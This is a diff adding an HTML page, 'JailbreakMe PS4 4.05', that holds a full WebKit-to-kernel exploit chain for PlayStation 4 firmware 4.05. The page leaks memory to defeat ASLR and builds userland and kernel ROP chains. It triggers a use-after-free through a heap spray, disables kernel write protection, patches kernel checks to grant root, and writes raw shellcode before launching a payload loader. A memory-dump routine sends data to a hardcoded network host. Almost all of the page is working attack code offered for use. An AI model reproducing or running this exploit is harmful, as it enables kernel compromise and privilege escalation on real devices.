@@ -1,0 +1,754 @@
+<!-- This page was originally made by qwertyoruiopz -->
+<html>
+<head>
+  <title>JailbreakMe PS4 4.05 (FULL JAILBREAK)</title>
+  <meta name="viewport" content="user-scalable=1.0,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
+  <meta name="apple-mobile-web-app-capable" content="no">
+  <meta name="format-detection" content="telephone=no">
+  <link rel="apple-touch-icon" href="touch-icon-iphone.png">
+  <meta name="apple-mobile-web-app-title" content="JailbreakMe" />
+  <style>
+    body
+    {
+      overflow: hidden;
+      position: fixed;
+      position: relative;
+    }
+
+    h1
+    {
+      overflow: hidden;
+      position: fixed;
+      position: absolute;
+      top: 40%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+    }
+
+    footer
+    {
+      position: absolute;
+      left: 0;
+      bottom: 0;
+      height: 40px;
+      width: 100%;
+      overflow:hidden;
+    }
+  </style>
+  <script src=loader.js></script>
+  <script src=syscalls.js></script>
+</head>
+<body>
+  <script>
+    /* Get user agent for determining system firmware */
+    var ua = navigator.userAgent;
+
+    /* Called from exploit.js upon success */
+    window.postexploit = function(p)
+    {
+      var fwFromUA = ua.substring(ua.indexOf("5.0 (") + 19, ua.indexOf(") Apple"));
+      document.getElementById("clck").style.display = 'none';
+
+      var print = function(string) {
+        document.getElementById("console").innerHTML += string + "\n";
+      }
+
+      window.nogc = [];
+
+      print("=== Exploit Successful ===");
+
+      /* Used to leak parseFloat() for deriving webkit's base address and calling */
+      p.leakFunction = function(smashFunction) {
+        var smashObj  = p.leakval(smashFunction);
+        var smashBase = p.read8(smashObj.add32(0x18));
+        return smashBase.add32(0x20);
+      }
+
+      var funcPointer = p.read8(p.leakFunction(parseFloat));
+
+      /* Calculate slide */
+      var webkitBase = funcPointer.add32(0); // copy
+      webkitBase.low &= ~0xFFF;
+      webkitBase.sub32inplace(0x55000);
+
+      moduleBaseAddresses['libSceWebKit2']  = webkitBase;
+
+      /* Get import map based on firmware from user-agent string */
+      generateBasicImportMap();
+
+      if(window.basicImportMap[fwFromUA] != null)
+      {
+        window.basicImports = window.basicImportMap[fwFromUA];
+      }
+      else
+      {
+        throw new Error("System may be vulnerable but does not have a valid import map!");
+      }
+
+      /* Get LIBC base address */
+      var libcBase = p.read8(webkitBase.add32(0x2729740));
+      libcBase.low &= ~0xFFF;
+      libcBase.sub32inplace(0x36000);
+
+      moduleBaseAddresses['libSceLibcInternal']  = libcBase;
+
+      /*
+        I was originally going to calculate libkernel's address via libSceSysmodule
+        however since we may require libkernel's address for some gadgets in the future
+        anyway, it's better to do it qwerty's way by leaking the stack_chk_fail import pointer.
+      */
+      var libkernel = p.read8(window.basicImports['__stack_chk_fail']);
+      libkernel.low &= ~0xFFF;
+      libkernel.sub32inplace(0x51000);
+
+      moduleBaseAddresses['libkernel']  = libkernel;
+
+      /* Get gadget map based on firmware from user-agent string */
+      generateGadgetMap();
+
+      if(gadgetMap[fwFromUA] != null)
+      {
+        window.gadgets = gadgetMap[fwFromUA];
+      }
+      else
+      {
+        throw new Error("System may be vulnerable but does not have a valid gadget map!");
+      }
+
+      /* Get syscall map based on firmware from user-agent string */
+      if(syscallMap[fwFromUA] != null)
+      {
+        window.syscalls = syscallMap[fwFromUA];
+      }
+      else
+      {
+        alert("Your system does not have a valid system call map! The exploit will still work but calling syscalls will not function properly...");
+      }
+
+      var funcPtrStore = p.leakFunction(parseFloat);
+      var funcArgs = [];
+
+      for(var i = 0; i < 0x7FFF; i++)
+        funcArgs[i] = 0x41410000 | i;
+
+      /* Ensure everything is aligned and the layout is intact */
+      var argBuffer = new Uint32Array(0x1000);
+      var argPointer = p.read8(p.leakval(argBuffer).add32(0x28));
+      argBuffer[0] = 0x13371337;
+
+      if(p.read4(argPointer) != 0x13371337)
+      {
+        throw new Error("Stack frame is not aligned!");
+      }
+
+      window.dont_tread_on_me = [argBuffer];
+
+      /* Load ROP chain into memory */
+      p.loadchain = function(chain)
+      {
+        var stackPointer = 0;
+        var stackCookie = 0;
+        var origRIP = 0;
+
+        var reEntry =
+        {
+          length:
+          {
+            valueOf: function()
+            {
+              origRIP = p.read8(stackPointer);
+              var returnToFrame = stackPointer;
+
+              var ocnt = chain.count;
+              chain.push64(stackPointer, origRIP);
+              chain.push64(stackPointer.add32(8), stackCookie);
+
+              if (chain.runtime) returnToFrame=chain.runtime(stackPointer);
+
+              chain.push(window.gadgets["pop rsp"]);
+              chain.push(returnToFrame);
+              chain.count = ocnt;
+
+              p.write8(stackPointer, window.gadgets["pop rsp"]);
+              p.write8(stackPointer.add32(8), chain.ropChainPtr);
+
+              return 0;
+            }
+          }
+        };
+
+        return (function()
+        {
+          /* Clear stack frame */
+          (function(){}).apply(null, funcArgs);
+
+          /* Recover frame */
+          var orig = p.read8(funcPtrStore);
+          p.write8(funcPtrStore, window.gadgets["mov rax, rdi"]);
+
+          /* Setup frame */
+          var trap = p.leakval(parseFloat());
+          var rtv = 0;
+          var fakeval = new int64(0x41414141, 0xffff0000);
+
+          (function()
+          {
+            var val = p.read8(trap.add32(0x100));
+            if ((val.hi != 0xffff0000) || ((val.low & 0xFFFF0000) != 0x41410000))
+            {
+              throw new Error("Stack frame corrupted!");
+            }
+          }).apply(null, funcArgs);
+
+          /* Write vtable, setjmp stub, and 'jump rax' gadget */
+          p.write8(argPointer, argPointer.add32(0x100));
+          p.write8(argPointer.add32(0x130), window.basicImports["setjmp"]);
+          p.write8(funcPtrStore, window.gadgets["jmp addr"]);
+
+          /* Clear and write to frame */
+          (function(){}).apply(null, funcArgs);
+          p.write8(trap.add32(0x18), argPointer);
+          p.leakval(parseFloat()); // Jumps to "setjmp" function stub in libkernel
+
+          /* Finish by resetting the stack's base pointer and canary */
+          stackPointer = p.read8(argPointer.add32(0x10));
+          stackCookie = p.read8(stackPointer.add32(8));
+
+          rtv=Array.prototype.splice.apply(reEntry);
+          p.write8(trap.add32(0x18), fakeval);
+          p.write8(trap.add32(0x18), orig);
+
+          return p.leakval(rtv);
+        }).apply(null, funcArgs);
+      }
+
+      p.call = function(rip, rdi, rsi, rdx, rcx, r8, r9) {
+        var retVal;
+        var addr = undefined;
+        var chain = new rop(p, addr);
+
+        chain.call(rip, rdi, rsi, rdx, rcx, r8, r9);
+
+        chain.push(window.gadgets["pop rdi"]);
+        chain.push(chain.ropChainPtr.add32(0xfff8));
+        chain.push(window.gadgets["mov qword ptr [rdi], rax"]);
+        chain.push(window.gadgets["pop rax"]);
+        chain.push(p.leakval(0x41414242));
+
+        if (chain.run().low != 0x41414242) throw new Error("Unexpected ROP behaviour");
+
+        retVal = p.read8(chain.ropChainPtr.add32(0xfff8));
+
+        /* If this check is true, errno was set and function returned -1 */
+        if(retVal.low == 0xFFFFFFFF && retVal.hi == 0xFFFFFFFF)
+        {
+          /* Recursion FTW! */
+          //retVal = p.call(libkernel.add32(0x7ccf0)); // replace this is only 3.55 offset
+
+          /* Dereference the pointer to get the value of errno */
+          retVal = p.read8(libkernel.add32(0x7ccf0));
+
+          //alert("ERRNO SET: " + retVal);
+
+          retVal = -1;
+        }
+
+        return retVal;
+      }
+
+      p.syscall = function(sysc, rdi, rsi, rdx, rcx, r8, r9)
+      {
+        if (typeof sysc == "string")
+        {
+          sysc = window.syscallnames[sysc];
+        }
+
+        if (typeof sysc != "number")
+        {
+          throw new Error("System call map does not contain an index for this syscall!");
+        }
+
+        var off = window.syscalls[sysc];
+        if (off == undefined)
+        {
+          throw new Error("System call map does not contain an index for this syscall!");
+        }
+
+        return p.call(libkernel.add32(off), rdi, rsi, rdx, rcx, r8, r9);
+      }
+
+      p.writeString = function (addr, str)
+      {
+          for (var i = 0; i < str.length; i++)
+          {
+              //p.write4(addr.add32(i), str.charCodeAt(i));
+              var byte = p.read4(addr.add32(i));
+              byte &= 0xFFFF0000;
+              byte |= str.charCodeAt(i);
+              p.write4(addr.add32(i), byte);
+          }
+      }
+
+      p.readString = function(addr)
+      {
+        var byte = p.read4(addr);
+        var str  = "";
+
+        while (byte & 0xFF)
+        {
+          str += String.fromCharCode(byte & 0xFF);
+          addr.add32inplace(1);
+
+          byte = p.read4(addr);
+        }
+
+        return str;
+      }
+
+      p.socket = function()
+      {
+        return p.syscall('sys_socket', 2, 1, 0); // 2 = AF_INET, 1 = SOCK_STREAM, 0 = TCP
+      }
+
+      p.connect = function(s, ip, port)
+      {
+        var sockAddr    = new Uint32Array(0x10);
+        var sockAddrPtr = p.read8(p.leakval(sockAddr).add32(0x28));
+        var ipSegments  = ip.split('.');
+
+        for(var seg = 0; seg < 4; seg++)
+        {
+          ipSegments[seg] = parseInt(ipSegments[seg]);
+        }
+
+        sockAddr[0] |= (((port >> 8) & 0xFF) << 0x10 | port << 0x18) | 0x200;
+        sockAddr[1]  = ipSegments[3] << 24 | ipSegments[2] << 16 | ipSegments[1] << 8 | ipSegments[0];
+        sockAddr[2]  = 0;
+        sockAddr[3]  = 0;
+
+        return p.syscall('sys_connect', s, sockAddrPtr, 0x10);
+      }
+
+      p.writeSocket = function(s, data, size)
+      {
+        return p.syscall('sys_write', s, data, size);
+      }
+
+      p.closeSocket = function(s)
+      {
+        return p.syscall('sys_close', s);
+      }
+
+      window.dumpMemory = function(addr, size)
+      {
+        var s = p.socket();
+
+        if(p.connect(s, '192.168.0.19', 9030) != 0)
+          return -1;
+
+        p.writeSocket(s, addr, size);
+        p.closeSocket(s);
+      }
+
+      /* Setup memory for data */
+      function malloc(size)
+      {
+        var backing = new Uint8Array(0x10000+size);
+        window.nogc.push(backing);
+        var ptr = p.read8(p.leakval(backing).add32(0x28));
+        ptr.backing = backing;
+        return ptr;
+      }
+
+      function stringify(str)
+      {
+        var bufView = new Uint8Array(str.length+1);
+        for (var i=0; i<str.length; i++) {
+            bufView[i] = str.charCodeAt(i) & 0xFF;
+        }
+        window.nogc.push(bufView);
+        return p.read8(p.leakval(bufView).add32(0x28));
+      }
+
+      /* Kernel Exploit Stuff Below */
+
+      /*
+        Exploit strategy:
+
+        1) We have a leak with sys_thr_get_ucontext. We'll use this to leak a pointer
+           to a cdev_priv object which we will leak by opening the dipsw device driver
+        2) We can create a named object with sys_namedobj_create()
+        3) We can set the lower 32-bits of offset 0's address in the object's structure
+           via sys_mdbg_service. Set lower 32-bits to that of cdev's lower 32-bits
+        4) We can now free() cdev with a call to sys_namedobj_delete()
+        5) Now that the cdev object is free'd and we still maintain a reference, spray
+           the heap to corrupt the object's backing memory
+        6) Use a system call (ioctl) to trigger corrupted function pointer to get code execution
+        7) Start a ROP chain in ring0 to write shellcode into kernel
+        8) Jump to shellcode and return to usermode
+        9) Apply patches for fun and profit!
+      */
+
+      var kernelBaseAddress = 0;
+
+      print("=== Checking kexploit status ===");
+      var kexploitCheck = p.syscall('sys_setuid', 0)
+
+      if(kexploitCheck == 0)
+      {
+        print("Status: Kernel Patched!");
+      }
+
+      if(kexploitCheck != 0)
+      {
+        print("Status: Kernel Not Patched...");
+        print("=== Starting Kernel Exploit Chain ===");
+
+        //////////////// SETUP ////////////////
+
+        print("Allocating Buffers...");
+
+        // Setup buffers for important pre-exploit stuff
+        var kernelBase = malloc(0x08);
+        var objBase = malloc(0x08);
+        var stackLeakFix = malloc(0x08);
+
+        var namedObj     = malloc(0x08);
+        var serviceBuff  = malloc(0x80);
+
+        // Setup buffers for important exploit stuff
+        var mdbgRet  = malloc(0x08);
+        var rtIoctl  = malloc(0x08);
+
+        var obj_cdev_priv = malloc(0x180);
+        var obj_cdevsw    = malloc(0x0B0);
+
+        // Setup buffers for important post-exploit stuff
+        var kernelBase = malloc(0x08);
+
+        // File descriptor for target
+        var targetDevFd = malloc(0x08);
+
+        // Setup Buffers related to leaking
+        var leakData       = malloc(0x4C0);
+        var leakScePThrPtr = malloc(0x08);
+
+        var createLeakThr = p.call(libkernel.add32(0x11570), leakScePThrPtr, 0, window.gadgets["infloop"], leakData, stringify("leakThr"));
+
+        //////////////// LEAK ////////////////
+
+        print("Calculating ASLR and Object Base...");
+
+        p.write8(namedObj, p.syscall('sys_namedobj_create', stringify("debug"), 0xDEAD, 0x5000));
+
+        var stage1 = new rop(p, undefined);
+
+        stage1.call(libkernel.add32(window.syscalls[window.syscallnames['sys_thr_suspend_ucontext']]), p.read4(p.read8(leakScePThrPtr)));
+        stage1.call(libkernel.add32(window.syscalls[window.syscallnames['sys_open']]), stringify("/dev/dipsw"), 0, 0);
+        stage1.saveReturnValue(targetDevFd);
+        stage1.call(libkernel.add32(window.syscalls[window.syscallnames['sys_thr_get_ucontext']]), p.read4(p.read8(leakScePThrPtr)), leakData);
+
+        stage1.run();
+
+        // Extract leaks
+        kernelBase = p.read8(leakData.add32(0x128)).sub32(0x109E96); // slide = 0x109E96
+        objBase = p.read8(leakData.add32(0x130));
+        stackLeakFix = p.read8(leakData.add32(0x20));
+
+        // Leak integrity check: kASLR defeat check
+        if(kernelBase.low & 0x3FFF)
+        {
+          alert("Bad leak! Terminating.");
+          return false;
+        }
+
+        print("Kernel base: 0x" + kernelBase);
+        print("Object leak: 0x" + objBase);
+
+        p.write8(serviceBuff.add32(0x4), objBase);
+        p.writeString(serviceBuff.add32(0x28), "debug");
+
+        //////////////// BUILD KROP CHAIN ////////////////
+        print("Building Kernel ROP Chain...");
+
+        var kchainstack = malloc(0x200);
+        var kchain = new krop(p, kchainstack);
+
+        // Disable kernel write protection
+        kchain.push(window.gadgets["pop rax"]);      // rax = 0x80040033;
+        kchain.push(0x80040033);
+        kchain.push(kernelBase.add32(0x389339));     // mov cr0, rax;
+
+        // Fix cdev_priv->cdp_c->si_devsw
+        kchain.write64(objBase.add32(0xB8), kernelBase.add32(0x1926550));
+
+        // Patch sys_mmap: Allow RWX (read-write-execute) mapping
+        var kernel_mmap_patch = new int64(0x37B74137, 0x3145C031);
+        kchain.write64(kernelBase.add32(0x31CFDC), kernel_mmap_patch);
+
+        // Patch syscall: syscall instruction allowed anywhere
+        var kernel_syscall_patch1 = new int64(0x0000000, 0xF8858B48);
+        var kernel_syscall_patch2 = new int64(0x0007DE9, 0x72909000);
+        kchain.write64(kernelBase.add32(0xED096), kernel_syscall_patch1);
+        kchain.write64(kernelBase.add32(0xED0BB), kernel_syscall_patch2);
+
+        // Patch sys_dynlib_dlsym: Allow from anywhere
+        var kernel_dlsym_patch1 = new int64(0x000000E9, 0x8B489000);
+        var kernel_dlsym_patch2 = new int64(0x90C3C031, 0x90909090);
+        kchain.write64(kernelBase.add32(0x14AADD), kernel_dlsym_patch1);
+        kchain.write64(kernelBase.add32(0xE2DA0), kernel_dlsym_patch2);
+
+        // Add custom sys_exec() call to execute arbitrary code as kernel
+        var kernel_exec_param = new int64(0, 1);
+        kchain.write64(kernelBase.add32(0xF179A0), 0x02);
+        kchain.write64(kernelBase.add32(0xF179A8), kernelBase.add32(0x65750));
+        kchain.write64(kernelBase.add32(0xF179C8), kernel_exec_param);
+
+        // Add kexploit check so we don't run kexploit more than once (also doubles as privilege escalation)
+        // E8 8B EE 15 00 89 C3 85 -> B8 00 00 00 00 89 C3 85
+        var kexploit_check_patch = new int64(0x000000B8, 0x85C38900);
+        kchain.write64(kernelBase.add32(0x85BB0), kexploit_check_patch);
+
+        // Fix object
+        kchain.push(window.gadgets["pop rax"]);
+        kchain.push(kernelBase.add32(0x19536E0));
+        kchain.push(window.gadgets["mov rax, qword ptr [rax]"]);
+        kchain.push(window.gadgets["pop rdi"]);
+        kchain.push(objBase.add32(0x50));
+        kchain.push(window.gadgets["mov qword ptr [rdi], rax"]);
+
+        // Exit kernel ROP chain
+        kchain.push(window.gadgets["pop rax"]);
+        kchain.push(stackLeakFix.add32(0x3C0));
+        kchain.push(window.gadgets["pop rcx"]);
+        kchain.push(window.gadgets["pop rsp"]);
+        kchain.push(window.gadgets["push rax; jmp rcx"]);
+
+        print("KROP chain size: " + kchain.count);
+
+        //////////////// FAKE THE OBJECT ////////////////
+        print("Creating Fake Object...");
+
+        //////// FAKE CDEV_PRIV ////////
+        p.write8(obj_cdev_priv.add32(0x008), 0x0000000000000004);
+
+        p.write8(obj_cdev_priv.add32(0x048), 0x00000000000001A4);
+        p.write8(obj_cdev_priv.add32(0x058), 0x0000001000000000); // Fix
+        p.write8(obj_cdev_priv.add32(0x060), 0x0000000000000004);
+        p.write8(obj_cdev_priv.add32(0x068), kernelBase.add32(0x19265F8));
+
+        p.write8(obj_cdev_priv.add32(0x0A0), objBase.add32(0x0E0));
+        p.write8(obj_cdev_priv.add32(0x0B8), obj_cdevsw); // Target Object
+        p.write8(obj_cdev_priv.add32(0x0C0), 0x0000000000010000);
+        p.write8(obj_cdev_priv.add32(0x0C8), 0x0000000000000001);
+        p.write8(obj_cdev_priv.add32(0x0E0), window.gadgets["ret"]); // New RIP value for stack pivot
+        p.write8(obj_cdev_priv.add32(0x0F0), objBase); // Use as a back pointer to the object
+        p.write8(obj_cdev_priv.add32(0x0F8), kchainstack); // New RSP value for stack pivot
+
+        //////// FAKE CDEVSW ////////
+        p.write8(obj_cdevsw.add32(0x38), libcBase.add32(0xa826f)); // d_ioctl - TARGET FUNCTION POINTER
+
+        //////////////// FREE THE OBJECT ////////////////
+        print("Freeing the object!");
+
+        var stage3 = new rop(p, undefined);
+
+        stage3.call(libkernel.add32(window.syscalls[window.syscallnames['sys_mdbg_service']]), 1, serviceBuff, 0);
+        stage3.call(libkernel.add32(window.syscalls[window.syscallnames['sys_namedobj_delete']]), p.read8(namedObj), 0x5000);
+
+        print("Spraying the heap!");
+
+        for(var i = 0; i < 500; i++)
+        {
+          stage3.call(libkernel.add32(window.syscalls[window.syscallnames['sys_ioctl']]), 0xDEADBEEF, 0x81200000, obj_cdev_priv);
+        }
+
+        stage3.run();
+
+        //////////////// TRIGGER ////////////////
+        print("Triggering kernel code execution");
+
+        p.syscall('sys_ioctl', p.read8(targetDevFd), 0x81200000, obj_cdev_priv);
+
+        //////////////// FIX ////////////////
+        print("Allocating executable memory for fix payload...");
+
+        var baseAddressExecute = new int64(0xDEAD0000, 0);
+        var exploitExecuteAddress = p.syscall("sys_mmap", baseAddressExecute, 0x10000, 7, 0x1000, -1, 0);
+
+        var executeSegment = new memory(p, exploitExecuteAddress);
+
+        var objBaseStore = executeSegment.allocate(0x8);
+        var shellcode = executeSegment.allocate(0x200);
+
+        p.write8(objBaseStore, objBase);
+
+        p.write4(shellcode.add32(0x00000000), 0x00000be9);
+        p.write4(shellcode.add32(0x00000004), 0x90909000);
+        p.write4(shellcode.add32(0x00000008), 0x90909090);
+        p.write4(shellcode.add32(0x0000000c), 0x90909090);
+        p.write4(shellcode.add32(0x00000010), 0x0082b955);
+        p.write4(shellcode.add32(0x00000014), 0x8948c000);
+        p.write4(shellcode.add32(0x00000018), 0x415741e5);
+        p.write4(shellcode.add32(0x0000001c), 0x41554156);
+        p.write4(shellcode.add32(0x00000020), 0x83485354);
+        p.write4(shellcode.add32(0x00000024), 0x320f18ec);
+        p.write4(shellcode.add32(0x00000028), 0x89d58949);
+        p.write4(shellcode.add32(0x0000002c), 0x64b948c0);
+        p.write4(shellcode.add32(0x00000030), 0x77737069);
+        p.write4(shellcode.add32(0x00000034), 0x49000000);
+        p.write4(shellcode.add32(0x00000038), 0x4120e5c1);
+        p.write4(shellcode.add32(0x0000003c), 0x000200bc);
+        p.write4(shellcode.add32(0x00000040), 0xc5094900);
+        p.write4(shellcode.add32(0x00000044), 0xd0b58d4d);
+        p.write4(shellcode.add32(0x00000048), 0x49ffcf14);
+        p.write4(shellcode.add32(0x0000004c), 0x8a509d8d);
+        p.write4(shellcode.add32(0x00000050), 0x81490003);
+        p.write4(shellcode.add32(0x00000054), 0x030b50c5);
+        p.write4(shellcode.add32(0x00000058), 0x868d4901);
+        p.write4(shellcode.add32(0x0000005c), 0x001d18d0);
+        p.write4(shellcode.add32(0x00000060), 0x00c68149);
+        p.write4(shellcode.add32(0x00000064), 0x48001d17);
+        p.write4(shellcode.add32(0x00000068), 0x48c04589);
+        p.write4(shellcode.add32(0x0000006c), 0xad0000a1);
+        p.write4(shellcode.add32(0x00000070), 0x000000de);
+        p.write4(shellcode.add32(0x00000074), 0x45894800);
+        p.write4(shellcode.add32(0x00000078), 0x888948c8);
+        p.write4(shellcode.add32(0x0000007c), 0x000000e0);
+        p.write4(shellcode.add32(0x00000080), 0xf080c748);
+        p.write4(shellcode.add32(0x00000084), 0x00000000);
+        p.write4(shellcode.add32(0x00000088), 0x48000000);
+        p.write4(shellcode.add32(0x0000008c), 0x00f880c7);
+        p.write4(shellcode.add32(0x00000090), 0x00000000);
+        p.write4(shellcode.add32(0x00000094), 0x1aeb0000);
+        p.write4(shellcode.add32(0x00000098), 0x00841f0f);
+        p.write4(shellcode.add32(0x0000009c), 0x00000000);
+        p.write4(shellcode.add32(0x000000a0), 0x4cee894c);
+        p.write4(shellcode.add32(0x000000a4), 0x8b48ff89);
+        p.write4(shellcode.add32(0x000000a8), 0xd0ffc045);
+        p.write4(shellcode.add32(0x000000ac), 0x01ec8341);
+        p.write4(shellcode.add32(0x000000b0), 0x02ba2774);
+        p.write4(shellcode.add32(0x000000b4), 0x4c000000);
+        p.write4(shellcode.add32(0x000000b8), 0x80bfee89);
+        p.write4(shellcode.add32(0x000000bc), 0x41000001);
+        p.write4(shellcode.add32(0x000000c0), 0x8d48d6ff);
+        p.write4(shellcode.add32(0x000000c4), 0x00006f3d);
+        p.write4(shellcode.add32(0x000000c8), 0xc7894900);
+        p.write4(shellcode.add32(0x000000cc), 0x31c68948);
+        p.write4(shellcode.add32(0x000000d0), 0x4cd3ffc0);
+        p.write4(shellcode.add32(0x000000d4), 0x75c87d39);
+        p.write4(shellcode.add32(0x000000d8), 0xe43145c7);
+        p.write4(shellcode.add32(0x000000dc), 0xc8758b48);
+        p.write4(shellcode.add32(0x000000e0), 0x5f3d8d48);
+        p.write4(shellcode.add32(0x000000e4), 0x31000000);
+        p.write4(shellcode.add32(0x000000e8), 0x0fd3ffc0);
+        p.write4(shellcode.add32(0x000000ec), 0x0000441f);
+        p.write4(shellcode.add32(0x000000f0), 0x0000a148);
+        p.write4(shellcode.add32(0x000000f4), 0x0000dead);
+        p.write4(shellcode.add32(0x000000f8), 0x89440000);
+        p.write4(shellcode.add32(0x000000fc), 0x3d8d48e6);
+        p.write4(shellcode.add32(0x00000100), 0x0000005c);
+        p.write4(shellcode.add32(0x00000104), 0x20148b4a);
+        p.write4(shellcode.add32(0x00000108), 0x08c48349);
+        p.write4(shellcode.add32(0x0000010c), 0xd3ffc031);
+        p.write4(shellcode.add32(0x00000110), 0x80fc8149);
+        p.write4(shellcode.add32(0x00000114), 0x75000001);
+        p.write4(shellcode.add32(0x00000118), 0x3d8d48d7);
+        p.write4(shellcode.add32(0x0000011c), 0x00000060);
+        p.write4(shellcode.add32(0x00000120), 0xd3ffc031);
+        p.write4(shellcode.add32(0x00000124), 0x18c48348);
+        p.write4(shellcode.add32(0x00000128), 0x415bc031);
+        p.write4(shellcode.add32(0x0000012c), 0x415d415c);
+        p.write4(shellcode.add32(0x00000130), 0x5d5f415e);
+        p.write4(shellcode.add32(0x00000134), 0x909090c3);
+        p.write4(shellcode.add32(0x00000138), 0x6f6c6c41);
+        p.write4(shellcode.add32(0x0000013c), 0x30203a63);
+        p.write4(shellcode.add32(0x00000140), 0x786c2578);
+        p.write4(shellcode.add32(0x00000144), 0x624f000a);
+        p.write4(shellcode.add32(0x00000148), 0x7463656a);
+        p.write4(shellcode.add32(0x0000014c), 0x6d754420);
+        p.write4(shellcode.add32(0x00000150), 0x78302070);
+        p.write4(shellcode.add32(0x00000154), 0x0a786c25);
+        p.write4(shellcode.add32(0x00000158), 0x00000000);
+        p.write4(shellcode.add32(0x0000015c), 0x00000000);
+        p.write4(shellcode.add32(0x00000160), 0x6265443c);
+        p.write4(shellcode.add32(0x00000164), 0x203e6775);
+        p.write4(shellcode.add32(0x00000168), 0x656a624f);
+        p.write4(shellcode.add32(0x0000016c), 0x2b207463);
+        p.write4(shellcode.add32(0x00000170), 0x25783020);
+        p.write4(shellcode.add32(0x00000174), 0x3a783330);
+        p.write4(shellcode.add32(0x00000178), 0x25783020);
+        p.write4(shellcode.add32(0x0000017c), 0x000a786c);
+        p.write4(shellcode.add32(0x00000180), 0x6265443c);
+        p.write4(shellcode.add32(0x00000184), 0x203e6775);
+        p.write4(shellcode.add32(0x00000188), 0x7473754a);
+        p.write4(shellcode.add32(0x0000018c), 0x726f4620);
+        p.write4(shellcode.add32(0x00000190), 0x7468203a);
+        p.write4(shellcode.add32(0x00000194), 0x3a737074);
+        p.write4(shellcode.add32(0x00000198), 0x77772f2f);
+        p.write4(shellcode.add32(0x0000019c), 0x6f792e77);
+        p.write4(shellcode.add32(0x000001a0), 0x62757475);
+        p.write4(shellcode.add32(0x000001a4), 0x6f632e65);
+        p.write4(shellcode.add32(0x000001a8), 0x61772f6d);
+        p.write4(shellcode.add32(0x000001ac), 0x3f686374);
+        p.write4(shellcode.add32(0x000001b0), 0x4a563d76);
+        p.write4(shellcode.add32(0x000001b4), 0x6d6c5247);
+        p.write4(shellcode.add32(0x000001b8), 0x4c6c6133);
+        p.write4(shellcode.add32(0x000001bc), 0x00000a59);
+
+        print("Running fix payload...");
+
+        var stage6 = new rop(p, undefined);
+
+        stage6.push(window.gadgets["pop rax"]);
+        stage6.push(11);
+        stage6.push(window.gadgets["pop rdi"]);
+        stage6.push(shellcode);
+        stage6.push(libkernel.add32(0x29CA)); // "syscall" gadget
+
+        stage6.run();
+      }
+
+      // Display results
+      print("=== Verifying kexploit patches ===");
+
+      print("setuid(0): " + p.syscall('sys_setuid', 0));
+      print("getuid():  " + p.syscall('sys_getuid'));
+
+      // Create loader memory
+      print("=== Launched Loader! ===");
+      var code_addr = new int64(0x26100000, 0x00000009);
+      var buffer = p.syscall("sys_mmap", code_addr, 0x300000, 7, 0x1000, -1, 0);
+
+      // Verify loaded
+      if(buffer == '926100000')
+      {
+          // Write kernel base
+          p.write8(code_addr.add32(0xFFFF0), kernelBase);
+          // Write loader
+          writeLoader(p, code_addr);
+
+          // Write syscall gadget
+          p.write8(code_addr.add32(0x2FFFF8), libkernel.add32(0x29C7));
+
+          // Launch thread
+          var thread = malloc(0x08);
+          var thr_name = malloc(0x100);
+          var tExitCode = malloc(0x08);
+          var exitMain = malloc(0x08);
+
+          p.writeString(thr_name, "loader");
+
+          print("scePthreadCreate: 0x" + p.call(libkernel.add32(0x11570), thread, 0, code_addr, 0, thr_name));
+          print("thread: 0x" + p.read8(thread));
+          print("=== Waiting for payload!!! ===");
+      }
+    }
+  </script>
+  <script src=expl.js></script>
+  <script src=gadgets.js></script>
+  <script src=rop.js></script>
+  <center><h1 id=clck>...</h1><strong>WebKit by <a href='https://twitter.com/qwertyoruiopz'>qwertyoruiopz</a></strong><br/>Kernel by <a href='https://twitter.com/specterdev'>SpecterDev</a><br/>This exploit contains a 4.05 kernel exploit!<br/></center>
+  <pre id="console" style="font-size: 20px"></pre>
+</body>
+</html>
